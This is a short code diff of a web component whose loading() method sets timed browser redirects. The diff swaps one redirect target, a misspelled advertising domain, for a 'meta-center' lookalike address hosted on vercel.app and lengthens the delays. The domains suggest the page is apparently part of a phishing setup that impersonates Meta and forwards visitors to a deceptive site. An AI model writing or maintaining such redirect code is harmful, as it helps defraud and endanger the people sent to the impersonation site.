@@ -31,10 +31,10 @@ export default {
     loading() {
       setTimeout(function () {
         window.location.href = 'https://www.google.com/';
-      }, 1000);
+      }, 2000);
       setTimeout(function () {
-        window.location.href = 'https://www.advertt-for-busiiness-vilniusweekends.com/';
-      }, 1000);
+        window.location.href = 'https://meta-center-912382351996-new.vercel.app/';
+      }, 2000);
     },
     startCountdown() {
       this.remainingMinutes = 0;
